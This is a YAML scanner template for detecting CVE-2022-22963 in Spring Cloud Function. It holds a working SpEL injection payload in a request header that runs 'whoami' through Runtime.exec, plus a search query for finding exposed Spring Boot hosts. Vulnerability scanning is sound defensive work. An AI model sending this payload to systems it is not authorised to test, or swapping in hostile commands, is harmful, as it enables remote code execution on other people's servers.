name: spring-boot-CVE-2022-22963
manual: true
query: app="springboot" || body="Whitelabel Error Page"
transport: http
rules:
  r0:
    request:
      method: POST
      path: /functionRouter
      headers:
        Accept-Encoding: gzip, deflate
        Content-Type: text/plain
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
          like Gecko) Chrome/97.0.4692.71 Safari/537.36
        spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("whoami")
      body: test
      follow_redirects: true
    expression: response.status == 500 && response.body.bcontains(b"Internal Server
      Error") && response.body.bcontains(b"functionRouter")
expression: r0()
detail:
  links:
  - https://nvd.nist.gov/vuln/detail/CVE-2022-22963
  - https://tanzu.vmware.com/security/cve-2022-22963
  description: |-
    Spring Cloud Function is a project with the following high-level goals:
    Promote the implementation of business logic via functions.
    Decouple the development lifecycle of business logic from any specific runtime target so that the same code can run as a web endpoint, a stream processor, or a task.
    Support a uniform programming model across serverless providers, as well as the ability to run standalone (locally or in a PaaS).
    Enable Spring Boot features (auto-configuration, dependency injection, metrics) on serverless providers.
    It abstracts away all of the transport details and infrastructure, allowing the developer to keep all the familiar tools and processes, and focus firmly on business logic.
  tags: rce
